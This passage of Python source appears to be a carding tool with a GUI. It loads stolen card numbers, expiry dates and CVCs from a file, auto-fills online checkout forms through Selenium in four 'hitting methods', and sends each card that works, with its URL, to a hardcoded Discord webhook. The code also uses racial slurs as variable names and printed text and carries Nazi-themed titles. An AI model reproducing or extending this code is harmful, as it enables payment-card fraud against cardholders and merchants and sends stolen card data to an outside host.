                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="billingAddressLine1"]').send_keys("numberr")
                    driver.implicitly_wait(0.1) 
                    driver.find_element(By.XPATH, '//*[@id="billingAddressLine2"]').send_keys("numberr")
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="billingLocality"]').send_keys("numberr")
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="billingPostalCode"]').send_keys("1")
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="root"]/div/div/div[2]/div/div[2]/form/div[2]/div/div[2]/button').click()
                    print(number + "|" + expiry_date + "|" + verif_code)
                except (NoSuchElementException, AttributeError):
                    print(str("hitted with" + number + "|" + expiry_date + "|" + verif_code))
                    nigguer = open("hitted.txt", "w+")
                    nigguer.write(number + "|" + expiry_date + "|" + verif_code)
                    nigguer.close()
                    fd = number + "|" + expiry_date + "|" + verif_code
                    linkline = linkline + 1
                    message = f"``` Hitted {linkw} URL \n WITH {fd} ```"
                    headers = {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                    }
                    payload = json.dumps({'content': message})
                    try:
                        req = Request("https://canary.discord.com/api/webhooks/1066455338343219210/wls-EGGtKCDlPRz_s14CHTdbEi31s_KUKlaiJh4EwG-4dci_-JSqAaivyExavxUWpgga", data=payload.encode(), headers=headers)
                        
                        urlopen(req)
                    except:
                        pass
                    continue
                time.sleep(4)        


def FuncHit2(self):
            global linkline
            CCSFile = open("kardty.txt", "r")
            for cc in CCSFile.readlines():
                mail123 = dpg.get_value(inputemail)
                #link123 = str(self.entryhmv_32.get())
                cc = cc.split("|")
                number = cc[0]
                name = f"{imieinazwisko}"
                expiry_date = cc[1] + cc[2].removeprefix("20")
                verif_code = cc[3]

                os.system("cls")
                chrome_options = Options()
                os.system("cls")
                
                #chrome_options.add_argument("--headless")
                
                os.system("cls")
                driver = webdriver.Chrome("chromedriver",chrome_options=chrome_options)
                os.system("cls")

                    
                try:
                    f=open('links.txt')
                    lines=f.readlines()
                    linkw = lines[linkline]
                    os.system("cls")
                    driver.get(f"{linkw}")
                    os.system("cls")
                    driver.maximize_window()
                    os.system("cls")
                    original_window = driver.current_window_handle
                    os.system("cls")
                    #print(original_window)  
                    print(f"{linkw}") 

                    driver.implicitly_wait(2)
                    os.system("cls")

                    if driver.current_window_handle != original_window:
                        print("nigga")

                    driver.find_element(By.XPATH, '//*[@id="email"]').send_keys(mail123)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="cardExpiry"]').send_keys(expiry_date)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="cardCvc"]').send_keys(verif_code)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="billingName"]').send_keys(name)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="cardNumber"]').send_keys(number)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="billingAddressLine1"]').send_keys("numberr")
                    driver.implicitly_wait(0.1) 
                    driver.find_element(By.XPATH, '//*[@id="billingAddressLine2"]').send_keys("numberr")
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="billingLocality"]').send_keys("numberr")
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="billingPostalCode"]').send_keys("1")
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="root"]/div/div/div[2]/div/div[2]/form/div[2]/div/div[2]/button').click()
                    print(number + "|" + expiry_date + "|" + verif_code)
                except (NoSuchElementException, AttributeError):
                    print(str("hitted with" + number + "|" + expiry_date + "|" + verif_code))
                    nigguer = open("hitted.txt", "w+")
                    nigguer.write(number + "|" + expiry_date + "|" + verif_code)
                    nigguer.close()
                    fd = number + "|" + expiry_date + "|" + verif_code
                    linkline = linkline + 1
                    message = f"``` Hitted {linkw} URL \n WITH {fd} ```"
                    headers = {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                    }
                    payload = json.dumps({'content': message})
                    try:
                        req = Request("https://canary.discord.com/api/webhooks/1066455338343219210/wls-EGGtKCDlPRz_s14CHTdbEi31s_KUKlaiJh4EwG-4dci_-JSqAaivyExavxUWpgga", data=payload.encode(), headers=headers)
                        
                        urlopen(req)
                    except:
                        pass
                    continue
                time.sleep(4)

def FuncHit3(self):
        CCSFile = open("kardty.txt", "r")
        global linkline
        for cc in CCSFile.readlines():
                mail1 = dpg.get_value(inputemail)
                cc = cc.split("|")
                number = cc[0]
                name = f"{imieinazwisko}"
                expiry_date = cc[1] + cc[2].removeprefix("20")
                verif_code = cc[3]  

                chrome_options = Options()
                
                #chrome_options.add_argument("--headless")
                
                driver = webdriver.Chrome("chromedriver",chrome_options=chrome_options)
                    
                try:
                    f=open('links.txt')
                    lines=f.readlines()
                    linkw = lines[linkline]
                    driver.get(f"{linkw}")
                    os.system("cls")
                    driver.maximize_window()
                    os.system("cls")
                    original_window = driver.current_window_handle
                    os.system("cls")
                    #print(original_window)  
                    print(f"{linkw}") 
                    driver.implicitly_wait(2)
                    os.system("cls")

                    #for window_handle in driver.window_handles:
                            #if window_handle != original_window:
                                #driver.switch_to.window(window_handle)
                                #print(original_window)
                                #print(window_handle)
                                #break

                    driver.find_element(By.XPATH, '//*[@id="email"]').send_keys(mail1)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="cardExpiry"]').send_keys(expiry_date)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="cardCvc"]').send_keys(verif_code)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="billingName"]').send_keys(name)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="cardNumber"]').send_keys(number)
                    driver.implicitly_wait(0.1)
                    driver.find_element(By.XPATH, '//*[@id="root"]/div/div/div[2]/div/div[2]/form/div[2]/div/div[2]/button').click()
                    print(number + "|" + expiry_date + "|" + verif_code)
                except (NoSuchElementException, AttributeError):
                        print(str("hitted with" + number + "|" + expiry_date + "|" + verif_code))
                        nigguer = open("hitted.txt", "w+")
                        nigguer.write(number + "|" + expiry_date + "|" + verif_code)
                        nigguer.close()
                        fd = number + "|" + expiry_date + "|" + verif_code
                        linkline = linkline + 1
                        message = f"``` Hitted {linkw} URL \n WITH {fd} ```"
                        headers = {
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                        }
                        payload = json.dumps({'content': message})
                        try:
                            req = Request("https://canary.discord.com/api/webhooks/1066455338343219210/wls-EGGtKCDlPRz_s14CHTdbEi31s_KUKlaiJh4EwG-4dci_-JSqAaivyExavxUWpgga", data=payload.encode(), headers=headers)
                            urlopen(req)
                        except:
                            pass
                        continue
                        
                time.sleep(4)

def FuncHit4(self):
            global linkline
            CCSFile = open("kardty.txt", "r")
            for cc in CCSFile.readlines():
                mail123 = dpg.get_value(inputemail)
                #link123 = str(self.entryhmv_32.get())
                cc = cc.split("|")
                number = cc[0]
                name = f"{imieinazwisko}"
                expiry_date = cc[1] + cc[2].removeprefix("20")
                verif_code = cc[3]

                chrome_options = Options()
                
                #chrome_options.add_argument("--headless")
                
                os.system("cls")
                driver = webdriver.Chrome("chromedriver",chrome_options=chrome_options)
                os.system("cls")

                        
                try:
                        f=open('links.txt')
                        lines=f.readlines()
                        linkw = lines[linkline]
                        os.system("cls")
                        driver.get(f"{linkw}")
                        os.system("cls")
                        driver.maximize_window()
                        os.system("cls")
                        original_window = driver.current_window_handle
                        #print(original_window)  
                        print(f"{linkw}") 
                        driver.implicitly_wait(2)
                        os.system("cls")
                        
                        for window_handle in driver.window_handles:
                                if window_handle != original_window:
                                    driver.switch_to.window(window_handle)
                                    print(original_window)
                                    print(window_handle)
                                    break
                        
                        
                        driver.find_element(By.XPATH, '//*[@id="cardNumber"]').send_keys(number)
                        driver.implicitly_wait(0.1)
                        driver.find_element(By.XPATH, '//*[@id="cardExpiry"]').send_keys(expiry_date)
                        driver.implicitly_wait(0.1)
                        driver.find_element(By.XPATH, '//*[@id="cardCvc"]').send_keys(verif_code)
                        driver.implicitly_wait(0.1)
                        driver.find_element(By.XPATH, '//*[@id="billingName"]').send_keys(name)
                        driver.implicitly_wait(0.1)
                        driver.find_element(By.XPATH, '//*[@id="root"]/div/div/div[2]/div/div[2]/form/div[2]/div/div[2]/button').click()
                        print(number + "|" + expiry_date + "|" + verif_code)
                except (NoSuchElementException, AttributeError):
                            print(str("hitted with" + number + "|" + expiry_date + "|" + verif_code))
                            nigguer = open("hitted.txt", "w+")
                            nigguer.write(number + "|" + expiry_date + "|" + verif_code)
                            nigguer.close()
                            linkline = linkline + 1
                            fd = number + "|" + expiry_date + "|" + verif_code
                            message = f"``` Hitted {linkw} URL \n WITH {fd} ```"
                            headers = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            payload = json.dumps({'content': message})
                            try:
                                req = Request("https://canary.discord.com/api/webhooks/1066455338343219210/wls-EGGtKCDlPRz_s14CHTdbEi31s_KUKlaiJh4EwG-4dci_-JSqAaivyExavxUWpgga", data=payload.encode(), headers=headers)
                                urlopen(req)
                            except:
                                pass
                            continue
                time.sleep(9)


#here cleaner func this function needs to be created separately to download the cleaner file which works as a cleaner as it can delete windows files like it happened to me XD


width, height, channels, data = dpg.load_image("C:\Windows\Venix\credit.png")
width4, height4, channels4, data4 = dpg.load_image("C:\Windows\Venix\credits.png")
width5, height5, channels5, data5 = dpg.load_image("C:\Windows\Venix\credit.png")

with dpg.texture_registry(show=False):
    dpg.add_static_texture(width=width, height=height, default_value=data, tag="texture_tag")
    dpg.add_static_texture(width=width4, height=height4, default_value=data4, tag="debloat")
    dpg.add_static_texture(width=width5, height=height5, default_value=data5, tag="hardware")
    


with dpg.window(tag="login",autosize=False, no_resize=True, no_title_bar=True, no_move=True, no_scrollbar=True, no_collapse=True, horizontal_scrollbar=True, no_focus_on_appearing=True, no_bring_to_front_on_focus=False, no_close=True, show=True, no_background=False, width=935, height=525, pos=(-5,0)):
    LoginTag = dpg.add_text("Hitlerka we love stripe", pos=(355, 170))
    inputlogin1 = dpg.add_input_text(label="", width=200,pos=(355,200))
    inputlogin2 = dpg.add_input_text(label="", width=200,pos=(355,230))
    inputlogin3 = dpg.add_input_text(label="", width=200,pos=(355,260))
    loginbutton1 = dpg.add_button(label=" login  ", pos=(355, 290), callback=login)
    loginbutton2 = dpg.add_button(label="register", pos=(463, 290), callback=register)


with dpg.window(tag="menu",autosize=False, no_resize=True, no_title_bar=True, no_move=True, no_scrollbar=True, no_collapse=True, horizontal_scrollbar=True, no_focus_on_appearing=True, no_bring_to_front_on_focus=False, no_close=True, show=True, no_background=False, width=935, height=525, pos=(-5,0)):
    dpg.draw_line((-110, -5), (1200, -5), color=(255,255,255), thickness=3)
    Bhardware = dpg.add_image_button(texture_tag="hardware",pos=(34,180), callback=HardB )
    dpg.draw_line((22, 230), (70, 230), color=(255,255,255), thickness=3)
    Bdebloat = dpg.add_image_button(texture_tag="debloat",pos=(34,256), callback=DebB )


with dpg.window(tag="Hardware", pos=(258,76),autosize=False, no_resize=True, no_title_bar=True, no_move=True, no_scrollbar=True, no_collapse=True, horizontal_scrollbar=True, no_focus_on_appearing=True, no_bring_to_front_on_focus=False, no_close=True, no_background=False, width=520, height=350, max_size=(520,400)):
    dpg.hide_item("Hardware")
    HardwareTag = dpg.add_text("Hitting methods", pos=(80, 30))
    dpg.draw_line((30, 175), (30, 80), color=(255,255,255), thickness=6)
    HardwareDesc = dpg.add_text("""zanim klikniesz kliknij prawym przyciskiem na przycisk :D
    """, pos=(60, 90))
    inputemail = dpg.add_input_text(label="", width=200,pos=(60,180), default_value="email")
    dpg.draw_line((160, 230), (345, 230), color=(255,255,255), thickness=3)
    HardwareButton1 = dpg.add_button(label="method 1", pos=(160, 250), callback=FuncHit1)
    with dpg.popup(dpg.last_item()):
        dpg.add_text("checkout without email with adress")
    HardwareButton2 = dpg.add_button(label="method 2", pos=(260, 250), callback=FuncHit2)
    with dpg.popup(dpg.last_item()):
        dpg.add_text("checkout adress and email")
    dpg.draw_line((160, 290), (345, 290), color=(255,255,255), thickness=3)
    HardwareButton3 = dpg.add_button(label="method 3", pos=(158, 310), callback=FuncHit3)
    with dpg.popup(dpg.last_item()):
        dpg.add_text("checkout with email without adress")
    HardwareButton4 = dpg.add_button(label="method 4", pos=(260, 310), callback=FuncHit4)
    with dpg.popup(dpg.last_item()):
        dpg.add_text("checkout without email without adress only card")
    dpg.draw_line((169, 350), (226, 350), color=(255,255,255), thickness=3)


with dpg.window(tag="Debloat", pos=(258,76),autosize=False, no_resize=True, no_title_bar=True, no_move=True, no_scrollbar=True, no_collapse=True, horizontal_scrollbar=True, no_focus_on_appearing=True, no_bring_to_front_on_focus=False, no_close=True, no_background=False, width=520, height=350):
    dpg.hide_item("Debloat")
    DebloatTag = dpg.add_text("Credits", pos=(80, 30))
    dpg.draw_line((30, 185), (30, 80), color=(255,255,255), thickness=6)
    DebloatDesc = dpg.add_text("""Gui Dev frozen#0108
Main Hitter Dev mchammer#0001
Project Dev eluwinka#9999


    """, pos=(60, 90))
    DebloatButton = dpg.add_button(label="Discord", pos=(217, 250), callback=FuncDebloat)

with dpg.theme() as global_theme:
    with dpg.theme_component(dpg.mvAll):
        dpg.add_theme_color(dpg.mvThemeCol_Button, (255,255,255), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_WindowBg, (14, 14, 14), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_FrameBg, (14, 14, 14), category=dpg.mvThemeCat_Core)
        dpg.add_theme_style(dpg.mvStyleVar_FrameRounding, 2, category=dpg.mvThemeCat_Core)
        dpg.add_theme_style(dpg.mvStyleVar_FrameBorderSize, 0, category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_Button, (255,255,255), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_ButtonHovered, (220, 220, 222), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_ButtonActive, [197, 197, 199], category=dpg.mvThemeCat_Core)

    with dpg.theme_component(dpg.mvButton):
        dpg.add_theme_style(dpg.mvStyleVar_FramePadding, 20,10, category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_Text, [0, 0, 0])
        dpg.add_theme_color(dpg.mvThemeCol_ButtonHovered, (220, 220, 222), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_ButtonActive, [197, 197, 199], category=dpg.mvThemeCat_Core)
        dpg.bind_font(font2)

       
with dpg.theme() as item_theme:
    with dpg.theme_component(dpg.mvAll):
        dpg.add_theme_color(dpg.mvPlotStyleVar_FillAlpha, 255, category=dpg.mvThemeCat_Core)

with dpg.theme() as options:
    with dpg.theme_component(dpg.mvAll):
        dpg.add_theme_color(dpg.mvThemeCol_Button, (14, 14, 14), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_ButtonHovered, (220, 220, 222), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_ButtonActive, [197, 197, 199], category=dpg.mvThemeCat_Core)


with dpg.theme() as item_theme:
    with dpg.theme_component(dpg.mvAll):
        dpg.add_theme_style(dpg.mvStyleVar_FramePadding, 15,5, category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_FrameBg, (20,20,20), category=dpg.mvThemeCat_Core)
        dpg.add_theme_style(dpg.mvStyleVar_FrameRounding, 2, category=dpg.mvThemeCat_Core)

with dpg.theme() as jarek:
    with dpg.theme_component(dpg.mvAll):
        dpg.add_theme_color(dpg.mvThemeCol_FrameBg, (20,20,20), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_Text, [255,255,255])

with dpg.theme() as jarek2:
    with dpg.theme_component(dpg.mvAll):
        dpg.add_theme_color(dpg.mvThemeCol_FrameBg, (255,255,255), category=dpg.mvThemeCat_Core)
        dpg.add_theme_color(dpg.mvThemeCol_Text, [0,0,0])


dpg.bind_item_font(DebloatDesc,font3)
dpg.bind_item_font(HardwareDesc,font3)
dpg.bind_item_font(DebloatTag,font5)
dpg.bind_item_font(HardwareTag,font5)
dpg.bind_item_theme(Bhardware,options)
dpg.bind_item_font(LoginTag,font5)
dpg.bind_item_theme(Bdebloat,options)
dpg.bind_item_theme(inputlogin1,jarek2)
dpg.bind_item_theme(inputlogin2,jarek2)
dpg.bind_item_theme(inputlogin3,jarek2)
dpg.bind_item_theme(inputemail,jarek)
dpg.bind_theme(global_theme)
dpg.create_viewport(title="hitlerka rikolens eluwinka", width=930, height=520, resizable=False, decorated=True)
dpg.configure_viewport(0, x_pos=550, y_pos=300)
dpg.setup_dearpygui()
dpg.set_viewport_small_icon("C:/Windows/Venix/favicon.ico")
dpg.set_viewport_large_icon("C:/Windows/Venix/favicon.ico")
dpg.set_viewport_min_height(0)
dpg.set_viewport_min_width(0)
dpg.show_viewport()
dpg.set_primary_window("menu", True)
dpg.start_dearpygui()

dpg.destroy_context()


